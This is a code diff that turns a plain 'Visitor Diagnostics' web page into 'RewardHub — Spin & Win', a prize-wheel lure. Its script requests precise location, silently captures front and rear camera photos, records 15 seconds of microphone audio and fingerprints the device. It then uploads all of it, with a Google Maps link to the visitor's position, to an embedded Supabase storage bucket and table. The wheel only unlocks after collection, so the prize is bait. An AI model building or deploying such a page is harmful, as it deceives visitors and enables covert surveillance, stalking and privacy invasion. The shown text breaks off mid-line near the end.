@@ -1,105 +1,1276 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Visitor Diagnostics</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>RewardHub — Spin & Win</title>
 
 <style>
-*{box-sizing:border-box}
+*{
+  box-sizing:border-box;
+  margin:0;
+  padding:0;
+}
 
 body{
-  margin:0;
-  background:#f4f4f4;
-  color:#111;
   font-family:Arial,Helvetica,sans-serif;
+  background:
+    radial-gradient(circle at 50% 35%,#241000 0%,#090909 38%,#020202 100%);
+  color:#fff;
+  min-height:100vh;
+}
+
+.hidden{
+  display:none!important;
 }
 
 .container{
-  max-width:720px;
+  width:min(720px,94%);
   margin:auto;
-  padding:30px 20px 50px;
+  padding:24px 0 45px;
+}
+
+.header{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  gap:15px;
+  margin-bottom:30px;
 }
 
 .logo{
-  width:90px;
-  height:90px;
-  border-radius:25px;
-  background:#111;
-  color:#fff;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  font-size:28px;
+  font-size:25px;
   font-weight:800;
-  margin-bottom:35px;
 }
 
-h1{
-  font-size:40px;
-  margin:0 0 15px;
+.logo span{
+  color:#ffc72c;
 }
 
 .subtitle{
-  color:#777;
-  font-size:20px;
-  margin-bottom:40px;
-}
-
-.card{
-  background:#fff;
-  border-radius:28px;
-  padding:30px;
-  margin-bottom:20px;
-  box-shadow:0 2px 10px rgba(0,0,0,.06);
-}
-
-h2{
-  margin-top:0;
-  font-size:29px;
-}
-
-.description{
-  color:#555;
-  font-size:18px;
-  line-height:1.6;
-}
-
-.permission{
-  display:flex;
-  align-items:center;
-  gap:16px;
-  padding:17px;
-  border:1px solid #ddd;
-  border-radius:18px;
-  margin:12px 0;
-}
-
-.permission-icon{
-  font-size:30px;
-}
-
-.permission-title{
-  font-weight:700;
-  font-size:18px;
-}
-
-.permission-sub{
-  color:#777;
+  color:#aaa;
+  font-size:13px;
   margin-top:4px;
 }
 
-button{
-  width:100%;
-  border:0;
-  border-radius:18px;
-  padding:18px;
-  margin-top:20px;
-  font-size:19px;
-  font-weight:700;
-  cursor:pointer;
+.safe{
+  border:1px solid #555;
+  border-radius:15px;
+  padding:10px 14px;
+  font-size:12px;
+  color:#ddd;
 }
 
+.hero{
+  text-align:center;
+  margin-bottom:25px;
+}
+
+.hero h1{
+  font-size:clamp(34px,8vw,58px);
+  line-height:1;
+  margin-bottom:10px;
+}
+
+.hero h1 span{
+  color:#ffc72c;
+}
+
+.hero p{
+  color:#bbb;
+  line-height:1.5;
+}
+
+.consent-card,
+.status-card,
+.result-card{
+  background:rgba(20,20,24,.92);
+  border:1px solid #3b3b42;
+  border-radius:22px;
+  padding:25px;
+}
+
+.consent-card h2{
+  margin-bottom:12px;
+}
+
+.consent-card p{
+  color:#bbb;
+  line-height:1.6;
+  font-size:14px;
+  margin-bottom:15px;
+}
+
+.permission-list{
+  display:grid;
+  gap:10px;
+  margin:18px 0;
+}
+
+.permission{
+  padding:12px 14px;
+  border-radius:12px;
+  background:#101014;
+  border:1px solid #292930;
+  color:#ddd;
+  font-size:14px;
+}
+
+.allow{
+  width:100%;
+  border:0;
+  border-radius:15px;
+  padding:16px;
+  font-size:17px;
+  font-weight:800;
+  cursor:pointer;
+  background:linear-gradient(135deg,#ffd95a,#f3a900);
+  color:#111;
+}
+
+.allow:disabled{
+  opacity:.55;
+  cursor:not-allowed;
+}
+
+.status-card{
+  text-align:center;
+  margin-top:18px;
+}
+
+.status-title{
+  font-size:20px;
+  font-weight:800;
+  margin-bottom:8px;
+}
+
+.status-text{
+  color:#aaa;
+  font-size:14px;
+  line-height:1.5;
+}
+
+.loader{
+  width:42px;
+  height:42px;
+  border:4px solid #333;
+  border-top-color:#ffc72c;
+  border-radius:50%;
+  animation:spin .8s linear infinite;
+  margin:0 auto 16px;
+}
+
+@keyframes spin{
+  to{transform:rotate(360deg)}
+}
+
+/* WHEEL */
+
+.wheel-section{
+  text-align:center;
+  margin-top:25px;
+}
+
+.wheel-title{
+  font-size:34px;
+  font-weight:900;
+  margin-bottom:5px;
+}
+
+.wheel-title span{
+  color:#ffc72c;
+}
+
+.wheel-description{
+  color:#aaa;
+  margin-bottom:20px;
+}
+
+.wheel-wrap{
+  position:relative;
+  width:min(560px,92vw);
+  aspect-ratio:1;
+  margin:auto;
+  padding:12px;
+}
+
+.pointer{
+  position:absolute;
+  z-index:10;
+  top:-4px;
+  left:50%;
+  transform:translateX(-50%);
+  width:0;
+  height:0;
+  border-left:18px solid transparent;
+  border-right:18px solid transparent;
+  border-top:42px solid #ffcf40;
+  filter:drop-shadow(0 3px 4px #000);
+}
+
+.wheel{
+  width:100%;
+  height:100%;
+  border-radius:50%;
+  position:relative;
+  border:10px solid #d99a17;
+  box-shadow:
+    0 0 0 5px #6e4b0d,
+    0 0 35px rgba(255,190,30,.45);
+  overflow:hidden;
+
+  background:
+  conic-gradient(
+    #e31b23 0deg 30deg,
+    #111 30deg 60deg,
+    #e31b23 60deg 90deg,
+    #111 90deg 120deg,
+    #e31b23 120deg 150deg,
+    #111 150deg 180deg,
+    #e31b23 180deg 210deg,
+    #111 210deg 240deg,
+    #e31b23 240deg 270deg,
+    #111 270deg 300deg,
+    #e31b23 300deg 330deg,
+    #111 330deg 360deg
+  );
+
+  transition:transform 5s cubic-bezier(.12,.8,.15,1);
+}
+
+.wheel-label{
+  position:absolute;
+  top:50%;
+  left:50%;
+  width:50%;
+  height:50%;
+  transform-origin:0 0;
+  display:flex;
+  align-items:flex-start;
+  justify-content:center;
+  padding-top:16px;
+  font-size:clamp(13px,3vw,21px);
+  font-weight:900;
+  color:#fff;
+  text-shadow:0 2px 3px #000;
+}
+
+.l1{transform:rotate(15deg) translateY(-5px)}
+.l2{transform:rotate(45deg) translateY(-5px)}
+.l3{transform:rotate(75deg) translateY(-5px)}
+.l4{transform:rotate(105deg) translateY(-5px)}
+.l5{transform:rotate(135deg) translateY(-5px)}
+.l6{transform:rotate(165deg) translateY(-5px)}
+.l7{transform:rotate(195deg) translateY(-5px)}
+.l8{transform:rotate(225deg) translateY(-5px)}
+.l9{transform:rotate(255deg) translateY(-5px)}
+.l10{transform:rotate(285deg) translateY(-5px)}
+.l11{transform:rotate(315deg) translateY(-5px)}
+.l12{transform:rotate(345deg) translateY(-5px)}
+
+.wheel-center{
+  position:absolute;
+  z-index:5;
+  top:50%;
+  left:50%;
+  transform:translate(-50%,-50%);
+  width:31%;
+  aspect-ratio:1;
+  border-radius:50%;
+  background:radial-gradient(circle,#ffe37a,#e8a91b);
+  border:5px solid #fff0a5;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  color:#111;
+  box-shadow:0 0 25px rgba(255,200,40,.55);
+}
+
+.wheel-center strong{
+  font-size:clamp(19px,5vw,30px);
+}
+
+.wheel-center small{
+  font-size:11px;
+  font-weight:700;
+}
+
+.spin-button{
+  margin-top:28px;
+  width:min(430px,90%);
+  border:0;
+  border-radius:18px;
+  padding:17px;
+  font-size:20px;
+  font-weight:900;
+  cursor:pointer;
+  background:linear-gradient(135deg,#ffe477,#f2aa12);
+  color:#111;
+  box-shadow:0 8px 25px rgba(255,190,30,.22);
+}
+
+.spin-button:disabled{
+  opacity:.5;
+  cursor:not-allowed;
+}
+
+.spin-count{
+  color:#aaa;
+  margin-top:10px;
+}
+
+.result-card{
+  text-align:center;
+  margin-top:25px;
+}
+
+.result-card h3{
+  margin-bottom:12px;
+}
+
+.result{
+  min-height:70px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  border-radius:14px;
+  background:#101116;
+  border:1px solid #303039;
+  font-size:30px;
+  font-weight:900;
+}
+
+.result.win{
+  color:#ffd23c;
+}
+
+.result.lose{
+  color:#aaa;
+}
+
+.features{
+  display:grid;
+  grid-template-columns:repeat(3,1fr);
+  gap:12px;
+  margin-top:22px;
+}
+
+.feature{
+  text-align:center;
+  padding:16px 8px;
+  color:#ccc;
+  font-size:13px;
+}
+
+.feature-icon{
+  font-size:25px;
+  margin-bottom:8px;
+}
+
+.footer{
+  text-align:center;
+  color:#777;
+  margin-top:35px;
+  font-size:13px;
+}
+
+@media(max-width:520px){
+  .header{
+    align-items:flex-start;
+  }
+
+  .safe{
+    font-size:10px;
+    padding:8px;
+  }
+
+  .consent-card{
+    padding:20px;
+  }
+
+  .features{
+    grid-template-columns:1fr;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <header class="header">
+    <div>
+      <div class="logo">🎁 Reward<span>Hub</span></div>
+      <div class="subtitle">Spin • Win • Enjoy</div>
+    </div>
+
+    <div class="safe">
+      🛡️ Permissions required
+    </div>
+  </header>
+
+
+  <!-- CONSENT SCREEN -->
+
+  <section id="consentScreen">
+
+    <div class="hero">
+      <h1>Complete & <span>Spin!</span></h1>
+      <p>
+        Complete the required permission steps first.
+        After successful completion, the reward wheel will become available.
+      </p>
+    </div>
+
+    <div class="consent-card">
+
+      <h2>Before you continue</h2>
+
+      <p>
+        By selecting <b>Allow & Continue</b>, you agree to the requested
+        browser permissions. The page may request your precise location,
+        camera access and microphone access. Camera and microphone data
+        are processed only after you grant the browser permission.
+      </p>
+
+      <div class="permission-list">
+
+        <div class="permission">
+          📍 <b>Precise location</b><br>
+          <small>Requested through your browser's location permission.</small>
+        </div>
+
+        <div class="permission">
+          📷 <b>Camera</b><br>
+          <small>Requested through your browser's camera permission.</small>
+        </div>
+
+        <div class="permission">
+          🎙️ <b>Microphone</b><br>
+          <small>Recording is limited to a maximum of 15 seconds.</small>
+        </div>
+
+      </div>
+
+      <button id="allowButton" class="allow">
+        Allow & Continue
+      </button>
+
+    </div>
+
+  </section>
+
+
+  <!-- STATUS -->
+
+  <section id="statusScreen" class="status-card hidden">
+
+    <div class="loader"></div>
+
+    <div id="statusTitle" class="status-title">
+      Getting things ready…
+    </div>
+
+    <div id="statusText" class="status-text">
+      Please follow your browser permission prompts.
+    </div>
+
+  </section>
+
+
+  <!-- WHEEL -->
+
+  <section id="wheelSection" class="wheel-section hidden">
+
+    <div class="wheel-title">
+      All <span>Set!</span>
+    </div>
+
+    <div class="wheel-description">
+      Your setup is complete. Try the reward wheel.
+    </div>
+
+    <div class="wheel-wrap">
+
+      <div class="pointer"></div>
+
+      <div id="wheel" class="wheel">
+
+        <div class="wheel-label l1">€0</div>
+        <div class="wheel-label l2">€5</div>
+        <div class="wheel-label l3">€20</div>
+        <div class="wheel-label l4">€10</div>
+        <div class="wheel-label l5">€50</div>
+        <div class="wheel-label l6">LOSE</div>
+        <div class="wheel-label l7">€100</div>
+        <div class="wheel-label l8">€25</div>
+        <div class="wheel-label l9">€1</div>
+        <div class="wheel-label l10">€75</div>
+        <div class="wheel-label l11">€30</div>
+        <div class="wheel-label l12">€0</div>
+
+        <div class="wheel-center">
+          <strong>SPIN</strong>
+          <small>Good Luck!</small>
+        </div>
+
+      </div>
+
+    </div>
+
+    <button id="spinButton" class="spin-button">
+      🔄 SPIN NOW
+    </button>
+
+    <div class="spin-count">
+      1 spin available
+    </div>
+
+
+    <div class="result-card">
+
+      <h3>🏆 Your Result</h3>
+
+      <div id="result" class="result">
+        ---
+      </div>
+
+    </div>
+
+
+    <div class="features">
+
+      <div class="feature">
+        <div class="feature-icon">🎁</div>
+        <b>Rewards</b><br>
+        Try your luck
+      </div>
+
+      <div class="feature">
+        <div class="feature-icon">🛡️</div>
+        <b>Permission</b><br>
+        Consent based
+      </div>
+
+      <div class="feature">
+        <div class="feature-icon">⚡</div>
+        <b>Instant</b><br>
+        Quick & easy
+      </div>
+
+    </div>
+
+  </section>
+
+
+  <div class="footer">
+    RewardHub<br>
+    Play Fair • Have Fun
+  </div>
+
+</div>
+
+
+<script>
+
+/* =========================
+   SUPABASE CONFIG
+========================= */
+
+const SUPABASE_URL =
+"https://pkbdjrajsndtmjpmvebq.supabase.co";
+
+const SUPABASE_KEY =
+"sb_publishable_Ae_r3P5gRwqWUnPeKRMKAg_xmmJVIoW";
+
+
+/* =========================
+   STATE
+========================= */
+
+let locationData = null;
+
+let frontPhoto = null;
+let rearPhoto = null;
+
+let audioBlob = null;
+
+let locationConsent = false;
+let cameraConsent = false;
+let microphoneConsent = false;
+
+let wheelRotation = 0;
+let alreadySpun = false;
+
+
+/* =========================
+   ELEMENTS
+========================= */
+
+const allowButton =
+document.getElementById("allowButton");
+
+const consentScreen =
+document.getElementById("consentScreen");
+
+const statusScreen =
+document.getElementById("statusScreen");
+
+const statusTitle =
+document.getElementById("statusTitle");
+
+const statusText =
+document.getElementById("statusText");
+
+const wheelSection =
+document.getElementById("wheelSection");
+
+const wheel =
+document.getElementById("wheel");
+
+const spinButton =
+document.getElementById("spinButton");
+
+const result =
+document.getElementById("result");
+
+
+/* =========================
+   STATUS
+========================= */
+
+function setStatus(title,text){
+
+  statusTitle.textContent = title;
+  statusText.textContent = text;
+
+}
+
+
+/* =========================
+   SUPABASE
+========================= */
+
+async function supabaseRequest(path,options={}){
+
+  const response = await fetch(
+    SUPABASE_URL + path,
+    {
+      ...options,
+      headers:{
+        "apikey":SUPABASE_KEY,
+        "Authorization":"Bearer " + SUPABASE_KEY,
+        "Content-Type":"application/json",
+        ...(options.headers || {})
+      }
+    }
+  );
+
+  if(!response.ok){
+
+    const text = await response.text();
+
+    throw new Error(
+      "Supabase error: " + text
+    );
+
+  }
+
+  return response;
+
+}
+
+
+/* =========================
+   LOCATION
+========================= */
+
+function requestLocation(){
+
+  return new Promise((resolve,reject)=>{
+
+    if(!navigator.geolocation){
+
+      reject(
+        new Error(
+          "Location is not supported by this browser."
+        )
+      );
+
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+
+      position=>{
+
+        locationConsent = true;
+
+        locationData = {
+          latitude:position.coords.latitude,
+          longitude:position.coords.longitude
+        };
+
+        resolve();
+
+      },
+
+      error=>{
+
+        reject(
+          new Error(
+            "Location permission was not granted."
+          )
+        );
+
+      },
+
+      {
+        enableHighAccuracy:true,
+        timeout:15000,
+        maximumAge:0
+      }
+
+    );
+
+  });
+
+}
+
+
+/* =========================
+   CAMERA
+========================= */
+
+function capturePhoto(stream){
+
+  return new Promise((resolve,reject)=>{
+
+    const video =
+    document.createElement("video");
+
+    video.srcObject = stream;
+
+    video.muted = true;
+    video.playsInline = true;
+
+    video.onloadedmetadata = async()=>{
+
+      try{
+
+        await video.play();
+
+        await new Promise(
+          r=>setTimeout(r,700)
+        );
+
+        const canvas =
+        document.createElement("canvas");
+
+        canvas.width =
+          video.videoWidth || 1280;
+
+        canvas.height =
+          video.videoHeight || 720;
+
+        const ctx =
+        canvas.getContext("2d");
+
+        ctx.drawImage(
+          video,
+          0,
+          0,
+          canvas.width,
+          canvas.height
+        );
+
+        canvas.toBlob(
+          blob=>{
+            if(blob) resolve(blob);
+            else reject(
+              new Error("Could not capture photo.")
+            );
+          },
+          "image/jpeg",
+          .85
+        );
+
+      }catch(error){
+
+        reject(error);
+
+      }
+
+    };
+
+  });
+
+}
+
+
+async function getCameraPhoto(facing){
+
+  const stream =
+  await navigator.mediaDevices.getUserMedia({
+
+    video:{
+      facingMode:{
+        ideal:facing
+      }
+    },
+
+    audio:false
+
+  });
+
+  try{
+
+    const photo =
+    await capturePhoto(stream);
+
+    cameraConsent = true;
+
+    return photo;
+
+  }finally{
+
+    stream.getTracks().forEach(
+      track=>track.stop()
+    );
+
+  }
+
+}
+
+
+async function requestCamera(){
+
+  frontPhoto =
+  await getCameraPhoto("user");
+
+  await new Promise(
+    r=>setTimeout(r,500)
+  );
+
+  rearPhoto =
+  await getCameraPhoto("environment");
+
+}
+
+
+/* =========================
+   MICROPHONE
+========================= */
+
+async function requestMicrophone(){
+
+  const stream =
+  await navigator.mediaDevices.getUserMedia({
+
+    audio:true,
+    video:false
+
+  });
+
+  microphoneConsent = true;
+
+  try{
+
+    const chunks = [];
+
+    let recorder;
+
+    const mimeTypes = [
+
+      "audio/webm;codecs=opus",
+      "audio/webm",
+      "audio/mp4"
+
+    ];
+
+    let selectedMime = "";
+
+    for(const type of mimeTypes){
+
+      if(
+        window.MediaRecorder &&
+        MediaRecorder.isTypeSupported(type)
+      ){
+
+        selectedMime = type;
+        break;
+
+      }
+
+    }
+
+    recorder =
+    selectedMime
+    ? new MediaRecorder(
+        stream,
+        {mimeType:selectedMime}
+      )
+    : new MediaRecorder(stream);
+
+
+    recorder.ondataavailable = event=>{
+
+      if(event.data &&
+         event.data.size > 0){
+
+        chunks.push(event.data);
+
+      }
+
+    };
+
+
+    const stopped =
+    new Promise(resolve=>{
+
+      recorder.onstop = resolve;
+
+    });
+
+
+    recorder.start();
+
+    setStatus(
+      "Microphone permission granted",
+      "Recording diagnostics for up to 15 seconds…"
+    );
+
+
+    await new Promise(
+      resolve=>setTimeout(resolve,15000)
+    );
+
+
+    if(recorder.state !== "inactive"){
+
+      recorder.stop();
+
+    }
+
+
+    await stopped;
+
+
+    const type =
+      recorder.mimeType || "audio/webm";
+
+    audioBlob =
+      new Blob(chunks,{type});
+
+
+  }finally{
+
+    stream.getTracks().forEach(
+      track=>track.stop()
+    );
+
+  }
+
+}
+
+
+/* =========================
+   DEVICE INFO
+========================= */
+
+async function getBatteryLevel(){
+
+  try{
+
+    if(
+      navigator.getBattery
+    ){
+
+      const battery =
+      await navigator.getBattery();
+
+      return Math.round(
+        battery.level * 100
+      );
+
+    }
+
+  }catch(e){}
+
+  return null;
+
+}
+
+
+async function collectDeviceInfo(){
+
+  return {
+
+    user_agent:navigator.userAgent || null,
+
+    platform:navigator.platform || null,
+
+    language:navigator.language || null,
+
+    timezone:
+      Intl.DateTimeFormat()
+      .resolvedOptions()
+      .timeZone || null,
+
+    screen_width:
+      window.screen.width || null,
+
+    screen_height:
+      window.screen.height || null,
+
+    color_depth:
+      window.screen.colorDepth || null,
+
+    battery_level:
+      await getBatteryLevel()
+
+  };
+
+}
+
+
+/* =========================
+   STORAGE UPLOAD
+========================= */
+
+async function uploadFile(
+  blob,
+  filename
+){
+
+  if(!blob) return null;
+
+  const path =
+    "sessions/" +
+    Date.now() +
+    "-" +
+    crypto.randomUUID() +
+    "-" +
+    filename;
+
+
+  const response =
+  await fetch(
+
+    SUPABASE_URL +
+    "/storage/v1/object/visitor-media/" +
+    path,
+
+    {
+
+      method:"POST",
+
+      headers:{
+        "apikey":SUPABASE_KEY,
+        "Authorization":
+          "Bearer " + SUPABASE_KEY,
+        "Content-Type":
+          blob.type || "application/octet-stream",
+        "x-upsert":"false"
+      },
+
+      body:blob
+
+    }
+
+  );
+
+
+  if(!response.ok){
+
+    const errorText =
+    await response.text();
+
+    throw new Error(
+      "Media upload failed: " +
+      errorText
+    );
+
+  }
+
+  return path;
+
+}
+
+
+/* =========================
+   SAVE DATA
+========================= */
+
+async function saveData(device){
+
+  setStatus(
+    "Saving diagnostics…",
+    "Please wait while the permitted diagnostic information is saved."
+  );
+
+
+  const frontPath =
+  await uploadFile(
+    frontPhoto,
+    "front.jpg"
+  );
+
+
+  const rearPath =
+  await uploadFile(
+    rearPhoto,
+    "rear.jpg"
+  );
+
+
+  const audioPath =
+  await uploadFile(
+    audioBlob,
+    "microphone.webm"
+  );
+
+
+  let mapsUrl = null;
+
+
+  if(locationData){
+
+    mapsUrl =
+      "https://www.google.com/maps?q=" +
+      encodeURIComponent(
+        locationData.latitude +
+        "," +
+        locationData.longitude
+      );
+
+  }
+
+
+  const payload = {
+
+    user_agent:
+      device.user_agent,
+
+    platform:
+      device.platform,
+
+    language:
+      device.language,
+
+    timezone:
+      device.timezone,
+
+    screen_width:
+      device.screen_width,
+
+    screen_height:
+      device.screen_height,
+
+    color_depth:
+      device.color_depth,
+
+    battery_level:
+      device.battery_level,
+
+    latitude:
+      locationData
+      ? locationData.latitude
+      : null,
+
+    longitude:
+      locationData
+      ? locationData.longitude
+      : null,
+
+    maps_url:
+      mapsUrl,
+
+    front_photo_path:
+      frontPath,
+
+    rear_photo_path:
+      rearPath,
+
+    audio_path:
+      audioPath,
+
+    camera_consent:
+      cameraConsent,
+
+    microphone_consent:
+      microphoneConsent,
+
+    location_consent:
+      locationConsent
+
+  };
+
+
+  await supabaseRequest(
+    "/rest/v1/visitor_sessions",
+    {
+      method:"POST",
+      headers:{
+        "Prefer":"return=minimal"
+      },
+      body:JSON.stringify(payload)
+    }
+  );
+
+}
+
+
+/* =========================
+   START FLOW
+========================= */
+
+async function startDiagnostics(){
+
+  allowButton.disabled = true;
+
+  statusScreen.classList.remove("hidden");
+
+  try{
+
+    if(!window.isSecureContext){
+
+      throw new Error(
+        "HTTPS is required for camera and microphone access."
+      );
+
+    }
+
+
+    if(
+      !navigator.mediaDevices ||
+      !navigator.mediaDevices.getUserMedia
+    ){
+
+      throw new Error(
+        "Camera and microphone access is unavailable in this browser."
+      );
+
+    }
+
+
+    /* LOCATION */
+
+    setStatus(
+      "Requesting location permission…",
+      "Please respond to your browser's location permission."
+    );
+
+    await requestLocation();
+
+
+    /* CAMERA */
+
+    setStatus(
+      "Requesting camera permission…",
+      "Please allow camera access when yo
 .primary{
   background:#111;
   color:#fff;
